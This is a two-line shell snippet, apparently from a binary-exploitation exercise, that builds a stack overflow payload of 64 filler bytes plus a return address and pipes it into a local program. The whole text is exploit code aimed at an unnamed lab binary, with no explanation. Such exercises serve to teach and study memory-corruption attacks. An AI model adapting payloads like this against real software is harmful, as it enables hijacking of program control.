python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+ b"\x24\x84\x04\x08")' > ~/payloads/ex03payload
./bin < ~/payloads/ex03payload 
